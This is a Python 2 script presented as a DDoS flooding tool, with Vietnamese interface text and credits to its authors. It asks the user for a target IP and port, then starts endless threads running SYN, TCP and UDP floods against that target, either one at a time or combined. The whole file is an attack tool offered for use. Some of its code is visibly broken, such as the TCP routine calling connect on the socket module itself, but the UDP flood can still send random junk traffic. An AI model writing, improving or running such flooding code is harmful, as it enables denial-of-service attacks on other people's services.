# -#- coding: cp1258 -#-
# python ddos flooding                            #
# Version 1.0.0                                   #      
# Coded by KymljnkII and Kit Hulk                 #
# Facebook : https://www.facebook.com/nhoc.nhi.790#
# File     : kymljnkII.py                         #
# # # # # # # # # # # # # # # # # # # # # # # # # #
" This tool create to fjx Kymljnk mistake ! I hope you can forgive :(( "
#IMPORTS
#coding: utf-8
import random
import socket
import sys
import threading

#KYMLJNKII SYN FLOOD
class synFlood(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip      = ip
        self.port    = port
        self.packets = packets
        self.syn     = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

#KYMLJNKII TCP FLOOD
class tcpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.tcp     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

#KYMLJNKII UDP FLOOD
class udpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.udp     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

#Main
print("        .----.  KymLjnkII - Con nuoi cua KitHulk - Ver 1.0  .----.        ")
print(".-.  Chon cac type: syn, tcp, udp, stu. Nhan Ctr-C de Stop Attack -.")
#Input gia tri vao
#Type
type = raw_input("Type: ")
#IP
ip = raw_input("IP: ")
#Port
port = raw_input("Port: ")
#Size
size = '65000'

if type!='syn':
    size=raw_input("Size: ")
#packets
packets = raw_input("Packets: ")

if type=='syn':
    try:
        dem = 0
        while True:
            dem = dem+1
            t = synFlood(ip,port,int(packets))
            t.start()
            print str(dem)+' - Kymljnk II Attack SYN -->'+ip+':'+port
    except:
        print 'Stop!'
        pass
elif type=='tcp':
    try:
        dem = 0
        while True:
            dem = dem+1
            t = tcpFlood(ip,port,size,int(packets))
            t.start()
            print str(dem)+' - Kymljnk II Attack TCP -->'+ip+':'+port
    except:
        print 'Stop!'
        pass
elif type=='udp':
    try:
        dem = 0
        while True:
            dem = dem+1
            t = udpFlood(ip,port,size,int(packets))
            t.start()
            print str(dem)+' - Kymljnk II Attack UDP -->'+ip+':'+port
    except:
        print 'Stop!'
        pass
elif type=='stu':
    try:
        dem = 0
        while True:
            dem = dem+1
            syn = synFlood(ip,port,int(packets))
            syn.start()
            tcp = tcpFlood(ip,port,size,int(packets))
            tcp.start()
            udp = udpFlood(ip,port,size,int(packets))
            udp.start()
            print str(dem)+' - Kymljnk II Attack STU -->'+ip+':'+port
    except:
        print 'Stop!'
        pass